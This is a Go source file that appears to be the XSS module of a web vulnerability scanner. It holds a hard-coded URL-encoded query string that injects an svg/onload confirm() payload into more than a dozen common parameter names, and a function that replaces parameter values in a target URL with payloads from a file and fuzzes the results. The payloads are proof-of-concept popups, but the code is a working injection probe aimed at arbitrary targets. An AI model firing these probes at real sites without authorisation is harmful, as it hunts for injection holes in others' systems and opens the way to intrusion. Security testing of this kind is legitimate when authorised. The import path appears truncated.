package modules

import (
	tools "/pkg"
	"regexp"
	"strings"
)

const generic string = `q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=
confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=
confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=
confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=
confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=
confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=
confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=
confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E`

func XSS(target string) {
	targets := []string{}
	match, _ := regexp.MatchString(`\=(.)\&?`, target)
	if match {
		regex := regexp.MustCompile(`\=(.)\&?`)
		matches := regex.FindAllStringSubmatch(target, -1)
		payloads, _ := tools.ReadLines(`/payloads/xss.txt`)
		for _, match := range matches {
			for _, payload := range payloads {
				targets = append(targets, strings.ReplaceAll(target, match[1], payload))
			}
		}
		targets = append(targets, target+`&`+generic)
	} else {
		targets = append(targets, target+`?`+generic)
	}
	tools.Fuzz(targets)
}
